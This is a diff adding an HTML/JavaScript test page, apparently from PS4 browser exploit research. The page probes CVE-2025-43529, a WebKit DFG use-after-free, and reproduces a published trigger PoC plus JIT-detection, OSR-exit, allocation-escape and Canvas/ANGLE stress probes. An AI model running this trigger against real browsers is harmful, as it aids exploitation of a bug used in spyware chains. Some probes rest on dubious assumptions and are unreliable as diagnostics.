@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>CVE-2025-43529 — DFG ObjectAllocationSinkingPhase UAF</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#ff2200;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#050508;border:2px solid #660000;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#ff9977;line-height:1.8}
+.src strong{color:#ff4444;display:block;margin-bottom:4px;font-size:11px}
+.warn{background:#1a0000;border:2px solid #ff0000;border-radius:5px;padding:10px;margin-bottom:12px;font-size:11px;color:#ff6666;line-height:1.7}
+#log{background:#060608;border:1px solid #1a1a2a;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:420px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#4488ff}.sep{color:#222}
+.btn{display:inline-block;margin-top:10px;margin-right:6px;padding:7px 14px;background:#110000;border:1px solid #441111;border-radius:4px;color:#cc4444;cursor:pointer;font:11px 'Courier New',monospace}
+.btn:hover{border-color:#ff2200;color:#ff4444}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🔴 CVE-2025-43529 — DFG ObjectAllocationSinkingPhase UAF</h1>
+<p class="meta">Fonte: Apple Security Advisory Dez/2025 · Explorado in-the-wild por spyware · Análise: zeroxjf/CVE-2025-43529-analysis</p>
+
+<div class="src">
+<strong>📋 DETALHES TÉCNICOS (DFGObjectAllocationSinkingPhase.cpp)</strong>
+ROOT CAUSE: missing isUnescapedAllocation() check em promoteLocalHeap()<br>
+TRIGGER: Phi merge onde um branch aloca objeto e o outro não → alocação "escapa"<br>
+FALHA:   hints para OSR exit são criadas SEM verificar se alocação ainda é válida<br>
+OSR EXIT: usa hints corrompidos → lê memória de objeto já liberado → UAF<br>
+<br>
+STATUS PS4: JIT DESABILITADO → DFG/FTL não ativo → bug principal inativo<br>
+ANÁLISE:   Padrão de escape analysis existe também em LLInt em forma atenuada<br>
+           ObjectTracker do JSC rastreia allocations em frames LLInt → verificar<br>
+EXPLORADO: "Extremely sophisticated attack against specific targeted individuals"<br>
+           Chained com CVE-2025-14174 (ANGLE OOB) para chain completo
+</div>
+
+<div class="warn">
+⚠️ <strong>ANÁLISE DE RELEVÂNCIA PS4:</strong><br>
+Bug principal (DFG Phi merge) = JIT only → não funciona diretamente no PS4<br>
+Testamos: detector JIT, padrão de escape analysis em LLInt, ANGLE path (CVE-2025-14174 chain)<br>
+Se PS4 tem algum JIT habilitado (versões especiais de FW) → crash = confirmação<br>
+Canvas/ANGLE path pode ser relevante independente do JIT
+</div>
+
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="t1()">① Detector JIT ativo?</button>
+  <button class="btn" onclick="t2()">② Phi Merge Pattern (JIT test)</button>
+  <button class="btn" onclick="t3()">③ OSR Exit Trigger</button>
+  <button class="btn" onclick="t4()">④ LLInt Allocation Tracking</button>
+  <button class="btn" onclick="t5()">⑤ ANGLE Canvas Path</button>
+  <button class="btn" onclick="t6()">⑥ Allocation Escape Pattern</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+(t||'')+'─','sep')}
+function gc(){var a=[];for(var i=0;i<20;i++)a.push(new ArrayBuffer(2*1024*1024));a=null}
+
+// T1: Detectar se JIT está ativo
+function t1(){
+  sep('Detector JIT Ativo (PS4 deve ser=NÃO)');
+  // Método 1: timing de hot loop (JIT acelera massivamente)
+  var t0=performance.now();
+  var acc=0;
+  for(var i=0;i<5e6;i++) acc+=i*i;
+  var dur=(performance.now()-t0).toFixed(1);
+  l('Hot loop 5M iterations: '+dur+'ms (acc='+acc%1000+')','i');
+  if(dur<20)       l('→ <20ms: JIT PROVAVELMENTE ATIVO (não PS4)','e');
+  else if(dur<100) l('→ <100ms: JIT incerto','w');
+  else             l('→ >100ms: JIT DESABILITADO ✓ (PS4 esperado)','ok');
+
+  // Método 2: Function.prototype.toString mostra bytecode se LLInt
+  try {
+    var fn=function hot(){return 1+1};
+    var src=fn.toString();
+    l('toString: '+src.substring(0,50),'i');
+    // JIT: toString retorna source normal. LLInt: igual.
+  } catch(e){}
+
+  // Método 3: performance.now micro-resolution indica timing JIT
+  var times=[];
+  for(var j=0;j<10;j++){
+    var a=performance.now();
+    for(var k=0;k<1000;k++) Math.sqrt(k);
+    times.push(performance.now()-a);
+  }
+  var avg=(times.reduce(function(a,b){return a+b},0)/10).toFixed(3);
+  l('sqrt 1000x avg: '+avg+'ms','i');
+  l('Status JIT: '+(parseFloat(avg)<0.5?'POTENCIALMENTE ATIVO':'INATIVO ✓'),'ok');
+}
+
+// T2: PoC original do CVE-2025-43529 (exige JIT)
+function t2(){
+  sep('Phi Merge Pattern — PoC Original (requer JIT)');
+  l('Reprodução exata do trigger CVE-2025-43529...','w');
+  l('(github.com/zeroxjf/CVE-2025-43529-analysis)','i');
+  try {
+    "use strict";
+    var sink=null;
+    function makeA(v){var o={};o.x=v;o.y=v+1;var a=[v,v+2];return {o,a}}
+    function makeB(v){var o={};o.x=v;o.y=v+3;var a=[v,v+4];return {o,a}}
+    function trigger(osrFlip){
+      var acc=0;
+      for(var i=0;i<300;i++){
+        // Phi merge — JIT deve lidar com 2 shapes de alocação
+        var pack=(i&1)?makeA(i):makeB(i);
+        acc+=pack.o.x;
+        if(osrFlip&&i===250) sink=pack; // força escape
+      }
+      return acc;
+    }
+    // Warmup (deve compilar com DFG se JIT ativo)
+    for(var w=0;w<100;w++) trigger(false);
+    // Trigger OSR com escape
+    var result=trigger(true);
+    l('Trigger retornou: '+result,'i');
+    l('sink='+JSON.stringify(sink&&{x:sink.o&&sink.o.x}),'i');
+    l('Sem crash com JIT desabilitado (esperado no PS4)','ok');
+    l('Se JIT ativo e crash aqui: CVE-2025-43529 CONFIRMADO','w');
+  } catch(e){
+    l('EXCEÇÃO: '+e.name+' — '+e.message,'e');
+    if(e instanceof RangeError||e.message.indexOf('memory')>=0)
+      l('→ Possível UAF manifestado como exceção','e');
+  }
+}
+
+// T3: OSR Exit focused probe
+function t3(){
+  sep('OSR Exit Stress Test');
+  l('Forçando OSR exits com objects de shapes diferentes...','w');
+  try {
+    "use strict";
+    var results=[];
+    function polymorph(x, shape) {
+      if(shape===0){ var o={a:x,b:x+1}; return o.a+o.b; }
+      else if(shape===1){ var o={c:x,d:x+2,e:x+3}; return o.c+o.d; }
+      else { var o={f:x}; return o.f; }
+    }
+    // Hot: força compilação JIT
+    var acc=0;
+    for(var i=0;i<1000;i++) acc+=polymorph(i,0);
+    // OSR exit: muda shape
+    for(var j=0;j<500;j++) acc+=polymorph(j,j%3);
+    l('OSR poly: acc='+acc%10000,'ok');
+    l('Sem crash = JIT inativo ou bug não presente','ok');
+  } catch(e){ l('CRASH: '+e.name,'e'); }
+}
+
+// T4: LLInt allocation tracking analysis
+function t4(){
+  sep('LLInt Allocation Tracking (sem JIT)');
+  l('Testando se tracking de alocações LLInt tem edge cases...','w');
+  try {
+    // Em LLInt, cada objeto criado em function scope é tracked
+    // Se o objeto "escapa" (assigned para outer var) durante uma iteração
+    // e a iteração termina, o tracking pode ficar stale
+    var leaked=null;
+    function allocAndMaybeEscape(i, shouldEscape) {
+      var obj={value:i, data:new Array(10).fill(i)};
+      if(shouldEscape) leaked=obj; // escape para escopo externo
+      return obj.value;
+    }
+    var sum=0;
+    for(var i=0;i<10000;i++){
+      sum+=allocAndMaybeEscape(i, i%100===0);
+    }
+    gc(); // GC com leaked ainda referenciando
+    // Tenta acessar o objeto "escapado" após GC
+    if(leaked){
+      l('leaked.value='+leaked.value+' (deve ser 9900)','ok');
+      l('leaked.data[0]='+leaked.data[0],'ok');
+    }
+    l('LLInt tracking: '+sum%1000+' sem crash','ok');
+  } catch(e){ l('CRASH LLInt tracking: '+e.name,'e'); }
+}
+
+// T5: ANGLE Canvas Path (CVE-2025-14174 chain component)
+function t5(){
+  sep('ANGLE Canvas Path (CVE-2025-14174 companion)');
+  l('CVE-2025-43529 foi chained com CVE-2025-14174 (ANGLE Metal OOB)','i');
+  l('Testando Canvas 2D com operações extremas...','w');
+  var canvas=document.createElement('canvas');
+  canvas.width=2048; canvas.height=2048;
+  var ctx=canvas.getContext('2d');
+  if(!ctx){l('Canvas 2D ausente','w');return}
+  try {
+    // Operações que estressam ANGLE/GPU backend
+    for(var i=0;i<100;i++){
+      ctx.clearRect(0,0,2048,2048);
+      ctx.fillStyle='rgba('+i+','+i+','+i+',0.5)';
+      ctx.fillRect(0,0,2048,2048);
+    }
+    // getImageData — lê dados do GPU (path que CVE-2025-14174 afetou)
+    var imageData=ctx.getImageData(0,0,2048,2048);
+    l('getImageData(2048x2048): OK '+imageData.data.length+' bytes','ok');
+
+    // Operações de drawImage com canvas sobre si mesmo
+    try {
+      ctx.drawImage(canvas,0,0,2048,2048,0,0,1024,1024);
+      l('drawImage self: OK','ok');
+    } catch(e2){ l('drawImage self: '+e2.name,'w'); }
+
+    // createImageBitmap com resize extremo
+    if(typeof createImageBitmap!=='undefined'){
+      createImageBitmap(canvas,{resizeWidth:1,resizeHeight:1}).then(function(bmp){
+        l('createImageBitmap resize: OK','ok');
+      }).catch(function(e){ l('createImageBitmap: '+e.message,'w'); });
+    }
+    l('ANGLE Canvas: sem crash detectado','ok');
+  } catch(e){ l('CRASH Canvas/ANGLE: '+e.name+' — '+e.message,'e'); }
+}
+
+// T6: Allocation Escape Analysis Pattern
+function t6(){
+  sep('Allocation Escape — LLInt Pattern Stressado');
+  l('Simulando padrão de escape em 50k iterações...','w');
+  try {
+    var external=[];
+    var freed=0;
+    function testEscape(n, escapeRate) {
+      var objects=[];
+      for(var i=0;i<n;i++){
+        var o={id:i, buf:new Uint8Array(64)};
+        objects.push(o);
+        if(i%escapeRate===0) external.push(o); // escape
+      }
+      objects=null; // libera referências internas
+      return external.length;
+    }
+    for(var round=0;round<20;round++){
+      var count=testEscape(1000, 10+round);
+      gc();
+    }
+    l('Escape rounds: 20 completados, external.length='+external.length,'ok');
+    // Verifica se external ainda tem objetos válidos após GC
+    var valid=0, corrupt=0;
+    external.slice(0,100).forEach(function(o){
+      try {
+        if(typeof o.id==='number'&&o.buf instanceof Uint8Array) valid++;
+        else corrupt++;
+      } catch(e){ corrupt++; }
+    });
+    l('Objetos escapados verificados: valid='+valid+' corrupt='+corrupt,corrupt>0?'e':'ok');
+    if(corrupt>0) l('→ Corrupção detectada em objeto escapado pós-GC!','e');
+  } catch(e){ l('CRASH escape: '+e.name,'e'); }
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ CVE-2025-43529 — DFG UAF + análises relacionadas','w');
+  l('Bug JIT principal não ativo no PS4, mas analisando padrões adjacentes','i');
+  t1();
+  setTimeout(t2,400);setTimeout(t3,800);setTimeout(t4,1200);
+  setTimeout(t5,1600);setTimeout(t6,2000);
+}
+</script>
+</body>
+</html>
